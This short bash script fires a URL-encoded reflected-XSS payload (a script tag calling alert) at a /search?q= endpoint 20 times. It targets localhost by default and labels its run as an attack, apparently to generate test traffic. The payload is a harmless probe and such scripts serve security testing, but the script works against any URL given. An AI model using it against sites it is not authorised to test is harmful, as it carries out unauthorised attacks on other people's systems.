#!/usr/bin/env bash
BASE="${1:-http://localhost:3000}"
echo "[XSS] attacking $BASE"
for i in {1..20}; do
  payload="%3Cscript%3Ealert('xss')%3C%2Fscript%3E"
  curl -s "${BASE}/search?q=${payload}" >/dev/null
  sleep 0.2
done
echo "[XSS] done"
